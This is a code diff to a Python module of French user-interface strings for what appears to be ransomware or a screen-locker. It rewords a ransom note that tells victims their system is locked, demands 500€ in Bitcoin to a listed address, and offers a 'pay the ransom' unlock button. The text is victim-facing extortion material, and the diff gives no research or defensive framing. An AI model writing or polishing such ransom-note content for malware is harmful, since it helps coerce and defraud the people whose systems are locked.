@@ -5,19 +5,19 @@ Messages pour l'interface utilisateur
 
 RANSOM_MESSAGES = {
 	"french": {
-		"title": "🔒 VOS FICHIERS ONT ÉTÉ CHIFFRÉS 🔒",
-		"subtitle": "Paiement requis pour récupérer vos données",
+		"title": "🔒 VOS FICHIERS ONT ÉTÉ BLOQUES 🔒",
+		"subtitle": "Paiement requis pour acceder a vos données",
 		"main_message": """
 ⚠️ ALERTE CRITIQUE : VOTRE SYSTÈME EST VERROUILLÉ ⚠️
-Vous ne pouvez plus accéder à vos fichiers sans la clé de déchiffrement.
-POUR RÉCUPÉRER VOS FICHIERS:
+Vous ne pouvez plus accéder à vos fichiers sans la clé de deverouillage.
+POUR ACCEDER A VOS FICHIERS:
 Effectuez un paiement de 500€ en Bitcoin à l'adresse suivante:
    bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
         """,
 		"warning": "⚠️ ALERTE CRITIQUE ⚠️",
 		"description": """
 Votre système a été compromis et vos fichiers sont désormais inaccessibles.
-Pour obtenir la clé de déchiffrement, entrez le code de paiement ci-dessous.
+Pour obtenir la clé de deverouillage, entrez le code de paiement ci-dessous.
         """,
 		"unlock_prompt": "Code de paiement :",
 		"unlock_button": "PAYER LA RANÇON",
